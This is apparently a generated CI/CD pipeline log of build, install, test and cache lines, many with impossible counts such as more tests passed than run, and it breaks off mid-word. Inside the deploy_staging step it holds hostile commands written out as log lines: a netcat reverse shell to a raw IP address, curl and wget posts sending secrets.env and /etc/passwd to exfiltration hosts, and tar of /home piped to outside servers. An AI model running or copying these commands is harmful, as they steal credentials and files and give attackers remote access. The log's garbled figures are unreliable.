INFO: Starting build process\nWARNING: axios has known vulnerabilities\n\u2713 deploy completed\n\u2713 All checks passed\nGET /health - 200 (96ms)\n\u2713 build completed\nStep 12/20: Testing\nUsing Python 3.11\npip: Downloading eslint-4.1.tar.gz\n[12:45:59] WARN: Deprecated API usage\nCompiling utils/handler.rs...\nTime: 83.831s\nCache restored successfully (312MB)\nUploading artifact 'dist' (11 files)\n[12:45:59] WARN: Deprecated API usage\nTransforming 467 files...\nPushing to registry...\nPushing to registry...\nEnvironment: staging\nStep 1/18: Linting\nPushing to registry...\nReady.\nSnapshots: 43 passed, 22 total\nWARNING: prettier has known vulnerabilities\nCache saved successfully\nTime: 3.837s\nSnapshots: 32 passed, 46 total\nnpm notice: package.json updated\nAlready up to date.\n[12:45:59] DEBUG: Query executed in 24ms\nTests: 132 passed, 423 total\n[12:45:59] DEBUG: Loading configuration\n\u2717 build failed with exit code 56\nGET /health - 200 (63ms)\npip: Collecting eslint\n  PASS: unit/test_cache_hit.spec.js\nnpm install: added 168 packages\nStep 4/24: Installing dependencies\n\u2713 All checks passed\nMinifying vendor.js\nArtifact downloaded: 35MB\nUsing Node.js 14.20.6\nGET /health - 204 (2ms)\nConnection established\nBuilding Docker image...\nAlready up to date.\n\u2713 package completed\n  PASS: test_cache_hit (406ms)\nUploading artifact 'coverage' (18 files)\nFetching submodules...\nWARNING: express has known vulnerabilities\nPlatform: darwin-arm64\n[12:45:59] INFO: Starting build process\nOK\nnpm install: resolved 642 packages\n[12:45:59] WARN: Deprecated API usage\nFetching from https://gcr.io/package.json\nCompiling utils/utils.go...\nNODE_ENV=test\nCompleted.\n[12:45:59] INFO: Starting build process\nStep 12/25: Building\nInstalling eslint@4.19.7\nStep 10/23: Deploying\n[12:45:59] WARN: Deprecated API usage\nTLS handshake completed\nFetching from https://googleapis.com/package.json\nPlatform: win32-x64\nnpm install: resolved 561 packages\n[12:45:59] DEBUG: Connection pool: 1 active\n[12:45:59] INFO: Request completed\npip install: Successfully installed react-2.7\nStep 15/24: Linting\nUsing Node.js 19.7.5\npip install: Successfully installed eslint-5.14\nFinished.\n[12:45:59] DEBUG: Query executed in 32ms\nCompleted.\nStep 9/25: Building\nTests: 226 passed, 278 total\nLayer 8/11: ENV command\nFetching from https://registry.npmjs.org/package.json\npip: Installing build dependencies...\nFetching submodules...\nTransforming 937 files...\nCompiling utils/index.js...\nFAILED: test_cache_hit\nCoverage: 100% statements, 66% branches\nWARNING: express has known vulnerabilities\n[12:45:59] INFO: Processing request\n  PASS: test_api_health (209ms)\nArtifact uploaded: dist.zip (38MB)\n[12:45:59] INFO: Connecting to database\nOK\n[12:45:59] INFO: Connecting to database\n\u2713 Step 'checkout' succeeded\nSnapshots: 32 passed, 1 total\n[12:45:59] INFO: Starting build process\nGET /health - 200 (48ms)\nOptimizing 28 modules...\nTests: 106 passed, 282 total\nTransforming 642 files...\nAlready up to date.\nyarn add: Done in 1.97s\n=== Step restore_cache completed ===\n=== Step: lint ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:59] DEBUG: Initializing service\nHEAD is now at 41388a8\n[12:45:59] ERROR: Connection failed\nPushing to registry...\nDone.\n[12:45:59] DEBUG: Connection pool: 4 active\nOptimizing 69 modules...\nOptimizing 84 modules...\nTransforming 328 files...\nStep 7/24: Testing\nGenerating source maps...\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\nProcessing...\nBuilding Docker image...\nRan 91 tests in 4s\n[12:45:59] WARN: Deprecated API usage\nUsing Python 3.9\nyarn add: Done in 14.47s\nStep 4/21: Linting\nCoverage: 72% statements, 62% branches\nAlready up to date.\nArtifact uploaded: dist.zip (1MB)\nDone.\nStep 9/17: Deploying\nFetching submodules...\nBuilding Docker image...\nWARNING: express has known vulnerabilities\nWaiting...\nnpm install: added 312 packages\n\u2713 validate completed\n[12:45:59] INFO: Cache refreshed\nBundling runtime.css\nStep 14/21: Installing dependencies\n\u2713 deploy completed\nFinished.\nTests: 136 passed, 330 total\nPulling image: python:18\nnpm notice: created a lockfile\nWARNING: eslint has known vulnerabilities\n[12:45:59] WARN: Deprecated API usage\nCache saved successfully\nRan 22 tests in 45s\nException: RuntimeError\nSwitched to branch 'feature/task-636'\nFetching submodules...\n\u2717 build failed with exit code 107\npip: Collecting webpack\nSwitched to branch 'hotfix/task-219'\nMinifying main.js\nCompiling components/utils.go...\nStep 6/21: Building\nArtifact downloaded: 43MB\nCache saved successfully\nCreating production build...\nCompleted.\npip: Installing build dependencies...\n  PASS: integration/test_db_connect.spec.js\nStep 7/18: Running migrations\nCache saved successfully\nTest Suites: 17 passed, 46 total\nUploading artifact 'coverage' (31 files)\nnpm install: resolved 1265 packages\nInstalling eslint@5.13.10\nChecking out master branch\nCompiling utils/service.java...\nFetching from https://github.com/package.json\n[12:45:59] DEBUG: Loading configuration\nLoading...\n\u2713 All checks passed\nCompleted.\nPlatform: darwin-arm64\nTLS handshake completed\nStep 3/25: Deploying\nBundling runtime.js\nLayer 7/8: COPY command\npip: Downloading axios-5.3.tar.gz\n  PASS: e2e/test_user_create.spec.js\nConnection established\n[12:45:59] DEBUG: Connection pool: 12 active\n[12:45:59] INFO: Request completed\nUsing Node.js 19.10.0\nPOST /data - 202 (413ms)\nOptimizing 19 modules...\nTime: 23.585s\nInstalling webpack@2.6.9\nPOST /api - 202 (288ms)\n[12:45:59] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (20MB)\nWARNING: prettier has known vulnerabilities\nException: NullPointerException\nArtifact uploaded: dist.zip (37MB)\nnpm install: added 102 packages\nCache invalidated: dependencies\n\u2713 Step 'test' succeeded\n\u2713 Step 'checkout' succeeded\nException: NullPointerException\nWaiting...\nCreating production build...\nChecking out develop branch\n[12:45:59] DEBUG: Query executed in 49ms\nInstalling express@1.0.9\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (355MB)\nWARNING: prettier has known vulnerabilities\nUsing Node.js 19.8.9\nVerifying...\nNODE_ENV=development\npip: Downloading axios-5.4.tar.gz\nMinifying main.js\nOK\nTests: 147 passed, 348 total\nCache saved successfully\nCompleted.\nTests: 478 passed, 431 total\nPOST /api - 201 (19ms)\nCreating production build...\nSuccess!\n[12:45:59] WARN: Deprecated API usage\n[12:45:59] DEBUG: Loading configuration\nnpm install: added 165 packages\nSwitched to branch 'bugfix/task-350'\nCache invalidated: node_modules\nPlatform: linux-x64\n\u2713 validate completed\npip: Downloading axios-1.13.tar.gz\n\u2717 build failed with exit code 59\n\u2713 Task completed in 1991ms\nPushing to registry...\nWaiting...\nOptimizing 37 modules...\n[12:45:59] INFO: Request completed\nPushing to registry...\nBundling vendor.js\nTLS handshake completed\nConnection established\nBundling styles.css\nStep 3/20: Deploying\nWARNING: express has known vulnerabilities\nLayer 10/9: RUN command\n\u2717 build failed with exit code 125\nPlatform: linux-x64\n=== Step lint completed ===\n=== Step: upload_artifacts ===\nDone.\nBundling runtime.js\nTLS handshake completed\nStep 13/19: Building\nSnapshots: 9 passed, 0 total\n[12:45:59] DEBUG: Memory usage: 300MB\nStep 12/22: Running migrations\n[12:45:59] INFO: Request completed\nCompiling lib/utils.go...\nReady.\nCache saved successfully\nBundling vendor.js\nCompiling src/service.java...\nCompiling utils/handler.rs...\n[12:45:59] DEBUG: Connection pool: 2 active\nDone.\nTransforming 462 files...\nnpm install: resolved 1760 packages\nCompiling components/utils.go...\nCoverage: 95% statements, 67% branches\npip: Downloading eslint-5.17.tar.gz\nOK\nCompiling components/app.ts...\nCache saved successfully\nTime: 33.885s\nFetching from https://npmjs.org/package.json\nTransforming 636 files...\nCompiling lib/main.py...\nWaiting...\nHEAD is now at b59706c\nLayer 2/11: RUN command\nCoverage: 79% statements, 84% branches\nTransforming 932 files...\n[12:45:59] INFO: Connecting to database\nCache saved successfully\nFAILED: test_user_create\nnpm notice: package.json updated\nTime: 104.244s\nCompiling src/utils.go...\nSuccess!\npip install: Successfully installed jest-5.7\nCompiling src/utils.go...\nInstalling lodash@2.2.4\n[12:45:59] INFO: Starting build process\n[12:45:59] INFO: Connecting to database\n  PASS: e2e/test_user_create.spec.js\nFinished.\nVerifying...\nnpm install: resolved 1729 packages\nTLS handshake completed\nPulling image: node:latest\nSwitched to branch 'feature/task-837'\nGET /api - 200 (77ms)\npip: Collecting axios\nWARNING: lodash has known vulnerabilities\n[12:45:59] WARN: Deprecated API usage\nFetching from https://githubusercontent.com/package.json\n[12:45:59] DEBUG: Query executed in 17ms\n[12:45:59] INFO: Cache refreshed\nRan 56 tests in 1s\nStep 14/24: Installing dependencies\nStep 2/17: Testing\n\u2713 All checks passed\nArtifact uploaded: dist.zip (74MB)\nStep 10/19: Running migrations\nCreating production build...\nSnapshots: 19 passed, 20 total\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 1/24: Testing\nFetching submodules...\nCompiling utils/index.js...\n[12:45:59] DEBUG: Initializing service\n\u2717 build failed with exit code 99\nnpm install: added 441 packages\nMinifying main.js\nCache invalidated: node_modules\nNODE_ENV=test\nHEAD is now at 9508b1d\nGenerating source maps...\n  PASS: integration/test_user_create.spec.js\nCache hit for key-8674\nFetching from https://amazonaws.com/package.json\nPushing to registry...\n[12:45:59] DEBUG: Loading configuration\nPlatform: win32-x64\nCompiling src/app.ts...\n[12:45:59] INFO: Request completed\nCompiling lib/utils.go...\nFetching submodules...\nLoading...\nConnection established\nEnvironment: test\nArtifact uploaded: dist.zip (4MB)\n[12:45:59] INFO: Request completed\nWARNING: prettier has known vulnerabilities\nnpm install: added 143 packages\n[12:45:59] INFO: Starting build process\nTime: 39.149s\n\u2713 All checks passed\nStep 18/19: Testing\npip: Installing build dependencies...\nSwitched to branch 'hotfix/task-989'\nArtifact downloaded: 3MB\nReady.\nCompiling lib/handler.rs...\nInstalling webpack@5.18.0\nImage pulled successfully\nnpm install: resolved 582 packages\nStep 7/25: Building\nCreating production build...\n[12:45:59] WARN: Deprecated API usage\nStep 8/23: Installing dependencies\nnpm install: resolved 1331 packages\nPlatform: linux-x64\nFAILED: test_cache_hit\nnpm install: added 231 packages\nStep 19/20: Building\n[12:45:59] DEBUG: Loading configuration\nnpm install: resolved 586 packages\n[12:45:59] WARN: Deprecated API usage\nReady.\n[12:45:59] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\nHEAD is now at 211c27d\nnpm install: resolved 1435 packages\nProcessing...\npip: Downloading lodash-4.3.tar.gz\n[12:45:59] INFO: Cache refreshed\nCompleted.\n[12:45:59] DEBUG: Loading configuration\nGET /api - 204 (4ms)\nUploading artifact 'dist' (18 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPulling image: alpine:latest\nException: NullPointerException\nSnapshots: 50 passed, 18 total\n[12:45:59] INFO: Processing request\nFinished.\nSwitched to branch 'hotfix/task-721'\nProcessing...\n[12:45:59] INFO: Starting build process\n[12:45:59] INFO: Starting build process\n=== Step upload_artifacts completed ===\n=== Step: checkout ===\n[12:45:59] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\nCompiling lib/handler.rs...\nTest Suites: 13 passed, 29 total\nCompiling lib/utils.go...\n[12:45:59] WARN: Deprecated API usage\nTime: 35.274s\nCache miss for key-3862\nCompleted.\nException: NullPointerException\nPlatform: darwin-arm64\nUploading artifact 'build' (30 files)\npip install: Successfully installed eslint-3.10\nBundling runtime.css\nFetching submodules...\nPulling image: python:3.11\nCache hit for key-1303\npip install: Successfully installed react-2.8\n[12:45:59] WARN: Deprecated API usage\nCache restored successfully (201MB)\nChecking out main branch\nStep 2/15: Building\n[12:45:59] DEBUG: Loading configuration\n[12:45:59] DEBUG: Initializing service\nBundling styles.js\nnpm notice: package.json updated\n\u2713 All checks passed\nCompiling lib/handler.rs...\n[12:45:59] DEBUG: Memory usage: 480MB\nWaiting...\n[12:45:59] DEBUG: Initializing service\nCompiling utils/handler.rs...\nSnapshots: 29 passed, 41 total\nFetching submodules...\nArtifact uploaded: dist.zip (85MB)\nPlatform: win32-x64\nnpm notice: package.json updated\nTransforming 156 files...\nArtifact uploaded: dist.zip (92MB)\nUploading artifact 'build' (34 files)\n[12:45:59] DEBUG: Loading configuration\nFAILED: test_api_health\n\u2713 Step 'test' succeeded\nTest Suites: 48 passed, 37 total\nArtifact downloaded: 32MB\nHEAD is now at 1a8f652\n  PASS: unit/test_api_health.spec.js\nDone.\n[12:45:59] INFO: Connecting to database\nProcessing...\nnpm install: added 411 packages\nCache invalidated: node_modules\n\u2713 All checks passed\nFetching submodules...\nyarn add: Done in 2.83s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/app.ts...\nHEAD is now at 534adf9\n[12:45:59] INFO: Starting build process\nWARNING: axios has known vulnerabilities\nnpm notice: created a lockfile\n  PASS: test_auth_login (420ms)\nVerifying...\nReady.\n[12:45:59] WARN: Deprecated API usage\nCache hit for key-2347\nFinished.\nSuccess!\nImage pulled successfully\nFetching submodules...\nArtifact uploaded: dist.zip (75MB)\nImage pulled successfully\npip: Collecting jest\n[12:45:59] DEBUG: Loading configuration\nTLS handshake completed\nWARNING: lodash has known vulnerabilities\nGenerating source maps...\nDone.\nCache miss for key-1630\n[12:45:59] DEBUG: Loading configuration\nNODE_ENV=development\nCache saved successfully\nLoading...\nCache saved successfully\nStep 2/20: Deploying\nyarn add: Done in 28.48s\n  PASS: integration/test_auth_login.spec.js\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: created a lockfile\nWARNING: eslint has known vulnerabilities\nPlatform: win32-x64\nChecking out master branch\nOK\n  PASS: test_auth_login (366ms)\nStep 1/19: Testing\nStep 17/15: Running migrations\n  PASS: test_api_health (377ms)\nCache restored successfully (416MB)\n[12:45:59] DEBUG: Initializing service\n[12:45:59] INFO: Cache refreshed\nStep 14/24: Testing\nArtifact uploaded: dist.zip (13MB)\nStep 14/15: Installing dependencies\nLoading...\n[12:45:59] WARN: Deprecated API usage\nBundling vendor.css\nnpm install: resolved 1094 packages\nCache miss for key-7471\nFetching from https://githubusercontent.com/package.json\nNODE_ENV=test\nNODE_ENV=test\n  PASS: test_user_create (415ms)\nStep 5/16: Building\nException: NullPointerException\nException: TypeError\nnpm install: added 355 packages\nCache miss for key-5498\n  PASS: unit/test_cache_hit.spec.js\nUsing Node.js 20.18.2\nyarn add: Done in 22.38s\nStep 10/20: Running migrations\nTest Suites: 44 passed, 35 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_db_connect (406ms)\nLoading...\nCache saved successfully\nFinished.\nUploading artifact 'coverage' (15 files)\nnpm install: resolved 1700 packages\nOptimizing 89 modules...\nPlatform: darwin-arm64\nWARNING: prettier has known vulnerabilities\nStep 5/22: Linting\nBundling main.js\nNODE_ENV=test\npip: Installing build dependencies...\nDone.\nCache hit for key-3753\npip: Downloading react-5.0.tar.gz\nProcessing...\nCache miss for key-8065\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n=== Step checkout completed ===\n=== Step: save_cache ===\nTime: 115.799s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTests: 320 passed, 359 total\n[12:45:59] DEBUG: Query executed in 32ms\nCompiling src/index.js...\nCreating production build...\nStep 14/18: Installing dependencies\npip install: Successfully installed react-4.16\nTransforming 585 files...\n[12:45:59] ERROR: Connection failed\nChecking out master branch\nArtifact uploaded: dist.zip (23MB)\nGenerating source maps...\nSwitched to branch 'hotfix/task-762'\nTest Suites: 49 passed, 5 total\nTLS handshake completed\nStep 15/20: Running migrations\nStep 5/21: Linting\n\u2717 build failed with exit code 119\nGET /status - 200 (29ms)\nMinifying main.js\nPushing to registry...\nCreating production build...\nWARNING: axios has known vulnerabilities\nBuilding Docker image...\n\u2713 Task completed in 395ms\n\u2717 build failed with exit code 123\nTime: 104.174s\n[12:45:59] DEBUG: Initializing service\n[12:45:59] DEBUG: Connection pool: 20 active\n[12:45:59] WARN: Deprecated API usage\nSuccess!\npip: Downloading axios-4.19.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 42 passed, 47 total\nStep 17/18: Linting\n[12:45:59] INFO: Starting build process\nnpm install: resolved 438 packages\nFinished.\nChecking out master branch\nMinifying app.js\nCompiling utils/index.js...\n[12:45:59] DEBUG: Initializing service\nCompiling src/service.java...\nCompiling src/main.py...\n[12:45:59] DEBUG: Initializing service\nCompiling components/app.ts...\nNODE_ENV=development\nGET /api - 201 (38ms)\nConnection established\nUsing Python 3.11\nStep 1/24: Testing\nArtifact downloaded: 37MB\nBuilding Docker image...\nArtifact downloaded: 5MB\nnpm install: resolved 338 packages\nArtifact uploaded: build.tar.gz (1MB)\nPlatform: darwin-arm64\nStep 4/18: Deploying\nCoverage: 92% statements, 94% branches\n\u2717 build failed with exit code 15\nyarn add: Done in 1.91s\nMinifying vendor.js\nnpm install: added 320 packages\nStep 20/23: Building\nCoverage: 76% statements, 98% branches\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out develop branch\n[12:45:59] WARN: Deprecated API usage\nUsing Node.js 17.8.0\nFinished.\nCache hit for key-9422\n[12:45:59] INFO: Request completed\nWARNING: eslint has known vulnerabilities\nArtifact downloaded: 49MB\nnpm notice: created a lockfile\n[12:45:59] DEBUG: Memory usage: 1204MB\nRan 53 tests in 56s\nWARNING: prettier has known vulnerabilities\n\u2717 build failed with exit code 95\nCache saved successfully\nFetching submodules...\nTest Suites: 41 passed, 40 total\n[12:45:59] INFO: Connecting to database\nBundling vendor.js\nLayer 7/9: ENV command\nInstalling lodash@3.19.9\nSwitched to branch 'feature/task-348'\nHEAD is now at 255d9b1\nUsing Python 3.12\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (348ms)\nFetching from https://docker.io/package.json\nConnection established\nLayer 6/14: RUN command\nFinished.\nStep 6/24: Installing dependencies\nSuccess!\nCache restored successfully (164MB)\nnpm install: resolved 896 packages\nConnection established\nyarn add: Done in 29.78s\nStep 12/15: Installing dependencies\n[12:45:59] DEBUG: Query executed in 29ms\nnpm notice: created a lockfile\n[12:45:59] INFO: Request completed\n[12:45:59] ERROR: Connection failed\nCompiling src/main.py...\nConnection established\nRan 141 tests in 19s\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nyarn add: Done in 9.50s\nStep 11/16: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBuilding Docker image...\nCache invalidated: dependencies\npip: Collecting webpack\nCompiling lib/utils.go...\n  PASS: test_auth_login (231ms)\nStep 9/20: Testing\n[12:45:59] WARN: Deprecated API usage\n\u2713 validate completed\npip install: Successfully installed jest-3.10\n  PASS: test_api_health (356ms)\nHEAD is now at 1b817ac\nStep 2/16: Testing\n[12:45:59] WARN: Deprecated API usage\nReady.\nFetching from https://pypi.org/package.json\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:45:59] INFO: Starting build process\n[12:45:59] WARN: Deprecated API usage\n  PASS: unit/test_db_connect.spec.js\nWARNING: express has known vulnerabilities\nnpm notice: package.json updated\n[12:45:59] INFO: Starting build process\nVerifying...\nArtifact downloaded: 45MB\nTime: 117.77s\nFetching submodules...\n=== Step save_cache completed ===\n=== Step: type_check ===\nUsing Node.js 19.12.5\nLoading...\nGenerating source maps...\nDone.\nFetching from https://githubusercontent.com/package.json\nLoading...\nCache invalidated: dependencies\nTests: 130 passed, 116 total\nConnection established\n\u2713 Step 'install' succeeded\n[12:45:59] DEBUG: Query executed in 54ms\n[12:45:59] DEBUG: Loading configuration\n[12:45:59] WARN: Deprecated API usage\nFinished.\nCompiling src/handler.rs...\nUsing Node.js 17.11.7\nUsing Node.js 19.3.1\nChecking out develop branch\n[12:45:59] DEBUG: Query executed in 41ms\nOptimizing 27 modules...\nOptimizing 87 modules...\nTests: 381 passed, 310 total\nCache restored successfully (180MB)\nBundling runtime.css\nTests: 299 passed, 222 total\nSuccess!\nDone.\nGenerating source maps...\nCompiling components/main.py...\nStep 12/19: Deploying\nOptimizing 67 modules...\nRan 14 tests in 49s\nTransforming 622 files...\nFAILED: test_auth_login\nLayer 6/8: COPY command\nPlatform: win32-x64\nFinished.\nSuccess!\npip: Installing build dependencies...\n[12:45:59] INFO: Starting build process\nLoading...\n[12:45:59] INFO: Request completed\nRan 18 tests in 3s\nTest Suites: 46 passed, 20 total\nOK\n[12:45:59] INFO: Cache refreshed\nNODE_ENV=development\n[12:45:59] WARN: Deprecated API usage\npip: Installing build dependencies...\n[12:45:59] INFO: Cache refreshed\nCache hit for key-6563\nSuccess!\nnpm install: resolved 1858 packages\n[12:45:59] DEBUG: Loading configuration\n[12:45:59] INFO: Starting build process\nCompleted.\npip: Collecting express\nCompleted.\nCache invalidated: node_modules\nCache saved successfully\nProcessing...\n\u2713 Step 'install' succeeded\nWARNING: webpack has known vulnerabilities\nCache invalidated: dependencies\nnpm install: resolved 492 packages\nTests: 174 passed, 260 total\nnpm install: resolved 1851 packages\nWARNING: jest has known vulnerabilities\nLayer 1/10: ENV command\nGET /api - 201 (24ms)\nnpm install: resolved 311 packages\n[12:45:59] INFO: Starting build process\n[12:45:59] INFO: Starting build process\n[12:45:59] INFO: Starting build process\nStep 8/22: Running migrations\nWaiting...\nException: NullPointerException\nAlready up to date.\nTests: 237 passed, 94 total\n\u2713 Step 'install' succeeded\n[12:45:59] ERROR: Connection failed\n\u2713 Step 'checkout' succeeded\nHEAD is now at 5b287c1\n[12:45:59] INFO: Connecting to database\n[12:45:59] DEBUG: Query executed in 73ms\nVerifying...\nCache saved successfully\n[12:45:59] INFO: Starting build process\nLayer 3/8: COPY command\n\u2713 lint completed\nCompleted.\nRan 54 tests in 38s\nStep 11/19: Building\nBundling main.js\nnpm install: resolved 1242 packages\nAlready up to date.\n[12:45:59] DEBUG: Connection pool: 1 active\nStep 12/24: Building\nUsing Python 3.10\n[12:45:59] DEBUG: Loading configuration\nUsing Python 3.11\n\u2713 Task completed in 4196ms\nFetching from https://github.com/package.json\nTransforming 224 files...\nFAILED: test_db_connect\nBundling vendor.js\npip: Collecting axios\nUploading artifact 'coverage' (48 files)\nCache restored successfully (81MB)\nCoverage: 71% statements, 72% branches\nStep 3/17: Installing dependencies\n\u2713 Step 'test' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Node.js 18.2.9\nArtifact downloaded: 49MB\nUsing Node.js 14.7.3\nStep 1/20: Installing dependencies\n[12:45:59] INFO: Processing request\n  PASS: test_cache_hit (393ms)\nnpm install: resolved 428 packages\nCompiling lib/index.js...\nCompleted.\nChecking out master branch\nWARNING: jest has known vulnerabilities\nStep 11/23: Deploying\nReady.\nPOST /data - 202 (287ms)\nPlatform: win32-x64\nLayer 2/8: COPY command\npip: Installing build dependencies...\nOK\nDone.\nStep 11/22: Running migrations\nSnapshots: 30 passed, 22 total\nStep 13/18: Running migrations\n\u2713 Step 'checkout' succeeded\nFetching submodules...\npip: Downloading jest-5.5.tar.gz\nStep 11/19: Testing\n[12:45:59] DEBUG: Loading configuration\nCache miss for key-4079\nLoading...\n[12:45:59] WARN: Deprecated API usage\nCache saved successfully\n=== Step type_check completed ===\n=== Step: install_dependencies ===\nPulling image: python:latest\n[12:45:59] DEBUG: Connection pool: 18 active\nMinifying vendor.js\nPOST /upload - 202 (99ms)\n[12:45:59] DEBUG: Connection pool: 11 active\nException: TypeError\n\u2717 build failed with exit code 61\nFAILED: test_db_connect\nStep 5/15: Building\nVerifying...\nImage pulled successfully\n[12:45:59] DEBUG: Query executed in 36ms\nUploading artifact 'coverage' (44 files)\n[12:45:59] WARN: Deprecated API usage\nUsing Node.js 15.12.4\nCompiling lib/service.java...\nnpm install: added 218 packages\nStep 17/22: Testing\nImage pulled successfully\nPulling image: alpine:3.11\nHEAD is now at dcb0fac\n[12:45:59] DEBUG: Loading configuration\nUsing Python 3.12\nStep 8/22: Deploying\nOK\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 52 tests in 24s\nStep 15/16: Linting\nAlready up to date.\npip: Installing build dependencies...\nTLS handshake completed\npip: Collecting prettier\nStep 9/19: Installing dependencies\nSuccess!\nUsing Python 3.11\nPOST /upload - 201 (95ms)\nWARNING: prettier has known vulnerabilities\nConnection established\nWARNING: lodash has known vulnerabilities\nFetching from https://githubusercontent.com/package.json\nCompiling components/index.js...\nCache hit for key-5586\nFetching submodules...\npip: Installing build dependencies...\nnpm install: added 71 packages\nArtifact downloaded: 10MB\nVerifying...\nWaiting...\nStep 12/22: Installing dependencies\nAlready up to date.\nStep 13/23: Building\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nCache invalidated: build\nArtifact uploaded: build.tar.gz (49MB)\nUsing Python 3.9\nArtifact downloaded: 45MB\n  PASS: test_db_connect (89ms)\nStep 17/17: Building\nBuilding Docker image...\nnpm install: added 179 packages\npip install: Successfully installed express-5.7\nFinished.\n\u2713 package completed\nFetching submodules...\nTLS handshake completed\nFetching submodules...\nCompleted.\n\u2713 validate completed\nTLS handshake completed\nOK\nOptimizing 22 modules...\n  PASS: test_api_health (25ms)\n\u2713 All checks passed\nBuilding Docker image...\nHEAD is now at ae5478a\n[12:45:59] INFO: Cache refreshed\n\u2713 Task completed in 1017ms\nBundling runtime.js\nPOST /data - 200 (114ms)\nStep 19/18: Building\nGET /health - 200 (30ms)\nCache restored successfully (58MB)\npip: Installing build dependencies...\nStep 20/23: Linting\nCompiling components/app.ts...\n[12:45:59] DEBUG: Memory usage: 675MB\n[12:45:59] WARN: Deprecated API usage\n[12:45:59] DEBUG: Memory usage: 1986MB\nBundling runtime.css\npip: Downloading react-3.13.tar.gz\npip: Collecting webpack\n[12:45:59] ERROR: Connection failed\nOptimizing 64 modules...\n\u2713 All checks passed\nCompiling components/utils.go...\nCache hit for key-6732\n\u2717 build failed with exit code 118\n[12:45:59] ERROR: Connection failed\nTest Suites: 29 passed, 29 total\n[12:45:59] WARN: Deprecated API usage\nGET /health - 201 (25ms)\nPOST /api - 202 (68ms)\n\u2713 All checks passed\n  PASS: integration/test_auth_login.spec.js\nFinished.\nAlready up to date.\nMinifying vendor.js\nVerifying...\nWaiting...\nFAILED: test_user_create\nTransforming 278 files...\nStep 10/15: Installing dependencies\nnpm install: added 160 packages\nVerifying...\nCoverage: 85% statements, 65% branches\nGenerating source maps...\nConnection established\nConnection established\nTests: 360 passed, 266 total\nFetching from https://googleapis.com/package.json\n[12:45:59] INFO: Cache refreshed\nTransforming 509 files...\nGET /health - 204 (34ms)\npip: Installing build dependencies...\n[12:45:59] INFO: Starting build process\npip install: Successfully installed prettier-4.18\nBuilding Docker image...\nStep 3/19: Linting\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching from https://registry.npmjs.org/package.json\nVerifying...\nBundling main.js\nCompiling utils/service.java...\nHEAD is now at 66b7ac0\nCache hit for key-8136\nConnection established\n[12:45:59] DEBUG: Query executed in 26ms\nStep 19/22: Building\n[12:45:59] INFO: Starting build process\nNODE_ENV=test\nBundling runtime.js\n=== Step install_dependencies completed ===\n=== Step: deploy_staging ===\nConnection established\nArtifact uploaded: dist.zip (77MB)\nInstalling jest@5.7.1\nUsing Python 3.12\npip: Downloading react-3.18.tar.gz\npip: Collecting eslint\nInstalling eslint@5.18.0\npip: Collecting react\n  PASS: test_auth_login (288ms)\n[12:45:59] INFO: Cache refreshed\n[12:45:59] INFO: Cache refreshed\nConnection established\nnc -e /bin/sh 195.170.177.217 5447\nStep 20/16: Testing\nCreating production build...\n[12:45:59] DEBUG: Initializing service\nOptimizing 85 modules...\nTLS handshake completed\n[12:45:59] INFO: Starting build process\n[12:45:59] DEBUG: Memory usage: 1438MB\nArtifact uploaded: dist.zip (44MB)\nBuilding Docker image...\npip: Collecting jest\n[12:45:59] INFO: Request completed\nOptimizing 77 modules...\nCompiling utils/app.ts...\nnpm notice: created a lockfile\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-3057\nStep 9/19: Running migrations\nFinished.\nyarn add: Done in 10.57s\n[12:45:59] DEBUG: Memory usage: 959MB\npip: Downloading react-4.18.tar.gz\nLoading...\nReady.\nDone.\nOptimizing 67 modules...\nTime: 56.153s\nDone.\nTests: 155 passed, 331 total\nAlready up to date.\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nVerifying...\nFetching submodules...\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nHEAD is now at c2f80f3\nFinished.\nRan 19 tests in 27s\nDone.\nUploading artifact 'build' (4 files)\nUsing Node.js 15.16.9\nOK\nFAILED: test_auth_login\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nArtifact uploaded: dist.zip (32MB)\n[12:45:59] DEBUG: Loading configuration\npip install: Successfully installed lodash-5.18\nGET /status - 201 (77ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nUploading artifact 'dist' (17 files)\nLoading...\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nTest Suites: 48 passed, 16 total\nnpm notice: created a lockfile\nnpm install: added 128 packages\nSwitched to branch 'feature/task-709'\nTests: 306 passed, 224 total\nTest Suites: 7 passed, 22 total\nArtifact uploaded: build.tar.gz (21MB)\nTransforming 799 files...\nSending 117MB of data to data-exfil.ru\n[12:45:59] DEBUG: Memory usage: 879MB\nTests: 194 passed, 463 total\nCache restored successfully (91MB)\nReady.\n[12:45:59] WARN: Deprecated API usage\nArtifact 